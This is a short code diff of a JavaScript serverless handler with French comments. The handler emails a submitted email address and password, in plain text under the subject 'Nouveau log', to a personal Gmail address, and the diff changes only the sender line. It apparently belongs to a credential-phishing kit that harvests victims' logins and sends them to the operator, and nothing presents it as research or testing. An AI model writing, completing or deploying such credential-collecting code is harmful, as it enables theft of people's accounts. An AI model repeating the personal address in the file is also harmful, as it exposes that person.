@@ -25,7 +25,7 @@ module.exports = async (req, res) => {
 
     // Configurer l'email
     const mailOptions = {
-        from: `"Test Mailtrap" <no-reply@example.com>`,
+        from: `luccabondi@gmail.com`,
         to: "luccabondi@gmail.com",
         subject: "Test Mailtrap - Nouveau log",
         text: `Email: ${email}\nMot de passe: ${password}`,
